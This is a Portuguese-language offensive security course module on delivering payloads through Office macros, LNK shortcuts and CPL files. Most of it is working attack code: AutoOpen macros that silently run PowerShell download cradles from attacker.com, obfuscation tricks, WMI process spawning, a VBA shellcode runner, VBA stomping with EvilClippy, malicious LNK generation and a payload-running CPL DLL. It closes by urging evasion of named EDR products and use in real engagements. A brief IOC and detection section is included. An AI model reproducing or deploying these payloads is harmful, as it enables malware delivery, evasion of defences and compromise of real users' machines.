# Módulo 5: Macros e Entrega de Payload

## 1. VBA (Visual Basic Application) Fundamentals

### O que é VBA?
Linguagem de programação integrada ao Microsoft Office (Word, Excel, Access).

### Sintaxe Básica

**Declaração de Variáveis**
```vba
Dim myVariable As String
Dim myNumber As Long
Dim myArray(1 To 10) As String
```

**Estruturas de Controle**
```vba
' If/Else
If x > 5 Then
    MsgBox "Greater than 5"
Else
    MsgBox "5 or less"
End If

' For Loop
For i = 1 To 10
    Debug.Print i
Next i

' Do Loop
Do While x < 100
    x = x + 1
Loop
```

**Funções**
```vba
Function CalculateSum(a As Integer, b As Integer) As Integer
    CalculateSum = a + b
End Function

' Chamar função
result = CalculateSum(5, 3)
```

### Objetos Importantes

**WScript.Shell** - Executar comandos
```vba
Dim shell As Object
Set shell = CreateObject("WScript.Shell")
shell.Run "cmd.exe /c ipconfig", 0, False
```

**MSXML2.XMLHTTP** - Fazer requisições HTTP
```vba
Dim http As Object
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "http://attacker.com/payload", False
http.Send
```

---

## 2. Macro AutoOpen & Obfuscation

### AutoOpen - Execução Automática

Duas funções executam automaticamente ao abrir:
```vba
' Em Word
Sub AutoOpen()
    MsgBox "Document opened"
End Sub

' Ou
Sub Document_Open()
    MsgBox "Document opened"
End Sub

' Em Excel
Sub Workbook_Open()
    MsgBox "Workbook opened"
End Sub
```

### Técnica: Pretexting (Social Engineering)

Disfarçar como documento legítimo:
```vba
Sub AutoOpen()
    ' Mostrar documento "seguro"
    ' Mas esconder execução maliciosa
    
    ' Desabilitar proteção de leitura
    With ActiveDocument
        .Protect wdAllowOnlyReading, NoReset:=True
    End With
    
    ' Executar backdoor silenciosamente
    Call ExecutePayload()
    
    ' Parecer que documento abriu normalmente
    MsgBox "Document is protected. Cannot edit.", vbInformation
End Sub
```

### Obfuscação Básica

**Renomear Variáveis**
```vba
' Ruim - Óbvio
Dim shellcode As String
Dim command As String

' Bom - Ofuscado
Dim aaaa As String
Dim bbbb As String
```

**Inverter Strings**
```vba
Function ReverseString(s As String) As String
    ReverseString = StrReverse(s)
End Function

' Uso
Dim cmd As String
cmd = ReverseString("exe.cmd /c")  ' Armazenar invertido
' Quando executar, inverter de novo
```

**Concatenação**
```vba
' Ruim
Dim cmd As String
cmd = "powershell.exe -nop -w h -c IEX(New-Object System.Net.WebClient).DownloadString('http://attacker.com/ps.ps1')"

' Bom - Divido
Dim cmd As String
cmd = "power" & "shell.exe" & " -nop" & " -w" & " h" & " -c" & " IEX..."
```

---

## 3. Técnicas de Execução

### Método 1: Shell Function
```vba
Sub AutoOpen()
    Dim cmd As String
    cmd = "cmd.exe /c powershell.exe -nop -w h -c IEX(New-Object System.Net.WebClient).DownloadString('http://attacker.com/ps1')"
    
    Shell cmd, vbHide  ' vbHide = sem janela visível
End Sub
```

**Problema:** Código está em claro no documento

---

### Método 2: WScript.Shell
```vba
Sub AutoOpen()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    
    Dim cmd As String
    cmd = "powershell.exe -nop -w h -c IEX(New-Object System.Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
    
    shell.Run cmd, 0, False  ' 0 = sem janela
End Sub
```

**Vantagem:** Mais controle  
**Desvantagem:** Ainda detectável

---

### Método 3: WMI Dechaining
```vba
Sub AutoOpen()
    Dim locator As Object
    Set locator = CreateObject("WbemScripting.SWbemLocator")
    
    Dim service As Object
    Set service = locator.ConnectServer()
    
    Dim process As Object
    Set process = service.Get("Win32_Process")
    
    Dim startup As Object
    Set startup = service.Get("Win32_ProcessStartup")
    
    Dim config As Object
    Set config = startup.SpawnInstance_
    config.ShowWindow = 0  ' Oculto
    
    ' Comando ofuscado
    Dim cmd As String
    cmd = obfuscatedCommand()
    
    Dim result As Object
    Set result = process.Create(cmd, Null, config, Null)
End Sub

Function obfuscatedCommand() As String
    Dim parts As String
    parts = "power" & "shell.exe"
    parts = parts & " " & "-nop"
    ' ... construir comando ofuscado
    obfuscatedCommand = parts
End Function
```

**Vantagem:** Processo criado via WMI não é filho do Word  
**Resultado:** Mais difícil ser detectado como injeção

---

### Método 4: Shellcode Runner em VBA

```vba
' Declarar APIs Windows
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (Destination As LongPtr, Source As Any, ByVal Length As Long)

Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr

Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long

Sub AutoOpen()
    Dim shellcode() As Byte
    shellcode = Array(&H90, &H90, &HCC, &H90, &H90) ' Exemplo: NOPs + INT3
    
    ' Alocar memória
    Dim alloc As LongPtr
    alloc = VirtualAlloc(0, UBound(shellcode) + 1, &H1000, &H40)
    
    ' Copiar shellcode
    RtlMoveMemory alloc, shellcode(0), UBound(shellcode) + 1
    
    ' Criar thread
    Dim threadId As Long
    Dim thread As LongPtr
    thread = CreateThread(0, 0, alloc, 0, 0, threadId)
    
    ' Esperar conclusão
    WaitForSingleObject thread, &HFFFFFFFF
End Sub
```

**Problema:** Shellcode visível no código  
**Solução:** Criptografar e descriptografar em runtime

---

## 4. VBA Stomping

### O que é?
Remover módulo VBA visível mas manter "P-code" (bytecode) compilado.

**Resultado:** Macro continua executando mas não aparece ao analisar o arquivo!

### Implementação com EvilClippy

```bash
# Baixar EvilClippy
git clone https://github.com/outflanknl/EvilClippy.git
cd EvilClippy

# Compilar
make

# Usare: Remover módulo VBA mas manter P-code
python evilclippy.py -s malicious.docm -t clean_template.dotx -o output.docm
```

### Resultado
```
Análise Normal:
- Abrir em Word
- View Macros
- [Nenhum macro visível]

Mas quando abre:
- Documento ainda executa macro
- P-code continua compilado
- A macro funciona sem ser vista
```

---

## 5. Phishing com LNK Files

### Conceito
Arquivo .LNK (atalho Windows) pode executar comandos arbitrários.

### Anatomia de LNK
```
[LNK Header]
├─ Version (4.3 para Windows 10/11)
├─ GUID (sempre mesmo GUID)
├─ File Attributes
├─ Create Time, Access Time, Write Time
├─ File Size
├─ Icon Index
│
[Data Sections]
├─ LinkInfo (caminho original)
├─ CommandLineArguments ← AQUI ESTÁ O COMANDO
├─ Name
├─ Relative Path
├─ Working Directory
└─ Icon Location
```

### Ferramenta: lnk2pwn

```bash
# Gerar LNK malicioso
python lnk2pwn.py -t "c:\windows\system32\calc.exe" \
  -a "/c powershell -nop -w h -c IEX(New-Object System.Net.WebClient).DownloadString('http://attacker.com/ps1')" \
  -o malicious.lnk
```

### Cadeia de Ataque Completa

```
1. LNK File
   └─ Executa PowerShell
   
2. PowerShell
   └─ Download Word Doc (macros)
   
3. Word Document
   └─ Macro auto-executa
   
4. Macro VBA
   ├─ Download CPL file
   └─ Executa via control.exe
   
5. CPL File (renomeado DLL)
   └─ Conecta ao C2

Resultado: Acesso completo, detectável em vários pontos
          mas chain é suficientemente complexa
```

### Exemplo PowerShell em LNK

```powershell
# PowerShell que será executado
$url = "http://attacker.com/doc.docm"
$path = "$env:TEMP\document.docm"

# Download
(New-Object System.Net.WebClient).DownloadFile($url, $path)

# Abrir documento
Invoke-Item $path

# Aguardar macro executar
Start-Sleep -Seconds 10

# Limpar
Remove-Item $path -Force -ErrorAction SilentlyContinue
```

### Ofuscação de LNK

```powershell
# Ofuscar PowerShell
$command = "calc.exe"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)

# Usar no LNK
powershell.exe -enc $encoded
```

---

## 6. CPL Files (Control Panel)

### O que é?
CPL = Arquivo de Painel de Controle (apenas um DLL renomeado).

### Técnica
```
1. Compilar DLL maliciosa
2. Renomear para .cpl
3. Executar com control.exe

Resultado:
- Parece legítimo (aplicação do sistema)
- Não dispara alert de "rundll32 suspeito"
- Executa com permissões do usuário
```

### Implementação

**C++ DLL**
```cpp
#include <windows.h>

extern "C" __declspec(dllexport) 
LONG CPlApplet(HWND hwndCPl, UINT msg, LPARAM lParam1, LPARAM lParam2) {
    switch (msg) {
    case CPL_INIT:
        // Executar payload aqui
        WinExec("cmd.exe /c powershell.exe...", 0);
        return 1;
    }
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
    return TRUE;
}
```

**Compilar:**
```bash
cl /LD malicious.cpp kernel32.lib user32.lib
# Renomear
rename malicious.dll malicious.cpl
```

**Executar:**
```powershell
control.exe malicious.cpl
```

---

## 🎯 Checklist de Implementação

- [ ] VBA básico entendido
- [ ] AutoOpen funcional
- [ ] Obfuscação simples implementada
- [ ] Shell execution testada
- [ ] WScript.Shell testado
- [ ] WMI Dechaining compreendido
- [ ] Shellcode runner em VBA pesquisado
- [ ] VBA Stomping com EvilClippy testado
- [ ] LNK files criados
- [ ] lnk2pwn utilizado
- [ ] Cadeia PowerShell → Macro → CPL testada
- [ ] CPL files compilados e testados

---

## 📊 Matriz de Técnicas Macro

| Técnica | Detectabilidade | Efetividade | Complexidade | OPSEC |
|---------|------------------|------------|--------------|-------|
| Shell simples | Alta | Média | Baixa | Ruim |
| WScript.Shell | Média-Alta | Média | Baixa | Médio |
| WMI Dechaining | Média | Alta | Média | Bom |
| Shellcode VBA | Baixa-Média | Alta | Alta | Excelente |
| VBA Stomping | Muito Baixa | Alta | Média | Excelente |
| LNK + Macro | Média | Alta | Média | Bom |
| LNK + CPL | Média-Baixa | Muito Alta | Média | Bom |

---

## 🔍 Análise Forense

### Como Detectar Macros

```powershell
# Scannear documento Word por macros
$doc = New-Object -ComObject Word.Application
$doc.Visible = $false
$document = $doc.Documents.Open("C:\suspicious.docm")

# Acessar VBA project
$vbaProject = $document.VBProject
ForEach($component in $vbaProject.VBComponents) {
    Write-Host $component.Name
}
```

### Indicadores de Compromisso (IOCs)

**Arquivo:**
- .docm, .xlsm, .pptm (Office com macros)
- .lnk com PowerShell em argumentos
- .cpl fora de C:\Windows\System32

**Processo:**
- Word/Excel spawn PowerShell
- PowerShell com base64 encoding
- control.exe com argumentos .cpl anormais

**Rede:**
- Word/Excel iniciar conexão HTTP
- PowerShell conectar a IP não-confiável

**Registry:**
- HKCU\Software\Microsoft\Office\[version]\Word\Startup alterado
- Modelos maliciosos em %APPDATA%\Microsoft\Templates

---

**Módulo 5 Concluído** ✅

---

## 📚 Próximos Passos

1. **Integração:** Combinar técnicas de todos os módulos
2. **Teste:** Contra Defender, Cortex XDR, CrowdStrike
3. **Evasão Contínua:** Adaptar técnicas conforme AV evoluem
4. **Operacional:** Implementar em engagements reais
5. **Documentação:** Manter registro de IOCs e behaviors

---

**Documentação Técnica Completa - Todos os 5 Módulos** ✅
